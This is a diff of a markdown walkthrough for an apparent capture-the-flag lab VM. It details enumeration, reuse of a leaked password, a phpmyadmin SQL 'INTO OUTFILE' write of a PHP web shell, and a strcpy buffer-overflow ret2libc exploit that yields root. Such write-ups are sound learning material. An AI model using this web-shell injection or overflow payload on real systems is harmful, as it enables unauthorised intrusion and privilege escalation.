@@ -1,61 +1,66 @@
 When we've set up our .iso file we will see this:
 
 We need to understand what exactly we are going to "hack".
-1. Using ifconfig to see the active interfaces, virtual boxes
+### 1. Using ifconfig to see the active interfaces, virtual boxes
    `ifconfig`:<br/>
     ![ifconfig](screens/1.jpg)
     
-2. Using nmap to see which ports are open for the VM and what exact ip address it located at 
+### 2. Using nmap to see which ports are open for the VM and what exact ip address it located at 
    `nmap 192.168.12.1-255`:<br/>
    ![nmap](screens/nmap.jpg)
       
    We see that port 80 accessible through the browser
 
-3. Put this 192.168.12.128 into the browser address field and you will get a simple page:<br/>
+### 3. Put this 192.168.12.128 into the browser address field and you will get a simple page:<br/>
       ![web_page](screens/web_page.jpg)
       
-4. Now we can use DIRB - scaner of the web content which can find possibly hidden information of the page using it's library
-   `./dirb http://192.168.12.128 wordlist/common.txt -w`
-   output gives us a possibility to see the "forum" folder and some other which are not really relevant:<br/>
-   ![dirb](screens/dirb.jpg)
-   Though http://192.168.12.128/forum not found in browser
+### 4. Now we can use DIRB - scaner of the web content which can find possibly hidden information of the page using it's library:<br/>
+   4.1 `./dirb http://192.168.12.128 wordlist/common.txt -w`<br/>
+       output gives us a possibility to see the "forum" folder and some other which are not really relevant:<br/>
+       ![dirb](screens/dirb.jpg)<br/>
+       Though http://192.168.12.128/forum not found in browser
 
-   * lets try ssl version of the site
-     `./dirb http://192.168.12.128 wordlist/common.txt -w`
-     and we get much more info now, but there are few main folders:<br/>
-     ![dirb_https](screens/dirb_https.jpg)<br/>
-      
-     ```https://192.168.12.128/forum```<br/>
-     ```https://192.168.12.128/webmail```<br/>
-     ```https://192.168.12.128/phpmyadmin```<br/>
+   4.2 lets try ssl version of the site<br/>
+       `./dirb http://192.168.12.128 wordlist/common.txt -w`<br/>
+       and we get much more info now, but there are few main folders:<br/>
+       ![dirb_https](screens/dirb_https.jpg)<br/>
+       https://192.168.12.128/forum<br/>
+       https://192.168.12.128/webmail<br/>
+       https://192.168.12.128/phpmyadmin<br/>
 
-5. First checking out the "forum" folder, proceeding in the browser to https://192.168.12.128/forum
+### 5. First checking out the "forum" folder, proceeding in the browser to https://192.168.12.128/forum <br/>
    5.1 We see few topics, checking first one with login problem, looks like the log outpit of log in attempts, one line contains some symbols that are looking like a password:<br/>
        
-   ![forum_log_pass](screens/forum_log_pass.jpg)
-   assuming that it was log in try we can think that it's user password, probably the one who created the topic
+   ![forum_log_pass](screens/forum_log_pass.jpg)<br/>
+   assuming that it was log in try we can think that it's user password, probably the one who created the topic<br/>
    
    5.2 Log in functionality is present on a forum, as well as users tab:<br/>
-   ![users](screens/forum_users.jpg)
-   
-   there are not so much users, so we going to try to login with credentials of them and this password that we have:
-       
-   the try to login with lmezard and password that we've found was successfull
+   ![users](screens/forum_users.jpg)<br/>
+   there are not so much users, so we going to try to login with credentials of them and this password that we have<br/>
+   the try to login with lmezard and password that we've found was successfull<br/>
+   ![user_profile](screens/forum_user_profile.jpg)<br/>
    Keep in mind that we have access to the "webmail" page and we see the email of the user
        
-6. Going to check the webmail page
-   6.1 trying if user email that we found and password that we used to login are matching, seems it works
-   6.2 inbox contains 2 emails, one is very interesting, but another one contains root DB access, which seems more relevant to us necause we remember that we have "phpmyadmin" page on a site
+### 6. Going to check the webmail page
+   6.1 trying if user email that we found and password that we used to login are matching, seems it works<br/>
+   ![web_mailer](screens/web_mailer.jpg)<br/>
+   6.2 inbox contains 2 emails, one is very interesting, but another one contains root DB access, which seems more relevant to us necause we remember that we have "phpmyadmin" page on a site<br/>
+   ![inbox](screens/inbox.jpg)<br/>
+   ![db_access_mail](screens/db_access_mail.jpg)<br/>
 
-7. phpmyadmin investigation
-   7.1 lets try to login with credentials that we've got
-   7.2 using suggestions from this topic http://www.informit.com/articles/article.aspx?p=1407358&seqNum=2 we are going to inject php file that allows us to run a shell commands from browser
-   During several attemtps of the injection files into different known folders that exist on the site, we were finally able to make a needed injection into the "temaplates_c" folder
-    `SELECT "<? System($_REQUEST['cmd']); ?>" into outfile "/var/www/forum/templates_c/cmd.php";`
-8. thanks to the tutorial we can now use shell commands of the server from the browser 
-   8.1 which gives us the possibility to find credentials to access the server found in password file in LOOKATME folder
-   8.2 looks like an ssh or ftp access 
-9.     the ssh try
+### 7. phpmyadmin investigation
+   7.1 lets try to login with credentials that we've got<br/>
+   7.2 using suggestions from this topic http://www.informit.com/articles/article.aspx?p=1407358&seqNum=2 we are going to inject php file that allows us to run a shell commands from browser<br/>
+   During several attemtps of the injection files into different known folders that exist on the site, we were finally able to make a needed injection into the "temaplates_c" folder<br/>
+    `SELECT "<? System($_REQUEST['cmd']); ?>" into outfile "/var/www/forum/templates_c/cmd.php";`<br/>
+    ![db_injection](screens/db_injection.jpg)<br/>
+### 8. thanks to the tutorial we can now use shell commands of the server from the browser 
+   8.1 which gives us the possibility to find credentials to access the server found in password file in LOOKATME folder<br/>
+   ![bash_in_browser](screens/bash_through_browser.jpg)<br/>
+   8.2 looks like an ssh or ftp access <br/>
+   ![lmezard_password](screens/lmezard_password.jpg)<br/>
+   
+### 9.     the ssh try
        ftp
        9.1 we can see two files, get them
        9.2 readme contains some hint for us
@@ -75,7 +80,7 @@ We need to understand what exactly we are going to "hack".
        now we see that the password "Iheartpwnage" looks like case sensetive
        9.6 In fun archive we also saw hint about SHA256, lets encode our password to SHA256 "330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4"
        9.7 and try to ssh on the server with "laurie@192.168.12.128" and password
-10. We are successfully ssh with laurie user
+### 10. We are successfully ssh with laurie user
     10.1 we see the README file that gives us a hint how to get password for the ssh access with user "thor"
     10.2 disasemple bomb file and we see 6 functions
          Phase_1 pushes value to the stack 0x80497c0, which is "Public speaking is very easy." Also hint says that password has no spaces and case sensetive, modifing string and getting first part of out password: `Publicspeakingisveryeasy.`
@@ -86,20 +91,20 @@ We need to understand what exactly we are going to "hack".
          Phase_6 the programm read_six_numbers and a hint gives us number 4, we also see 6 nodes {253} -> {725} -> {301} -> {997} -> {212} -> {432}, 4-th of the is the biggest, lets assume that we need to order them in descending order then our password part will be: `426315` though according to the forum we must swap 3 and 1 in last part to get the access
         The password in the end: `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
 
-11. ssh thor@192.168.12.128 
+### 11. ssh thor@192.168.12.128 
     We see the README and turtle files
     README suggests us to login with user zaz
     the turtle file is a draw map which is python module
     it gives us the word SLASH
-12. ssh zaz@192.168.12.128
+### 12. ssh zaz@192.168.12.128
     trying password SLASH, does not work
     sha256 encryption of SLASH does not work eather
     md5 does work
-13. we find a file exploit_me and it has a root rights
+### 13. we find a file exploit_me and it has a root rights
     If we open exploit_me into gdb we notice that we can use a buffer overflow attack and overwrite the EIP register due to the use of an unprotected strcpy.
     Playing around with the command line we can make the program crash at 140 bytes.
     ./exploit_me $(python -c "print('A' * 140)")
-14. 
+### 14. we need to exploit
 $ ./exploit_me $(python -c "print('A' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'AAAA' + '\xb7\xf8\xcc\x58'[::-1])")
 id
 uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz) 
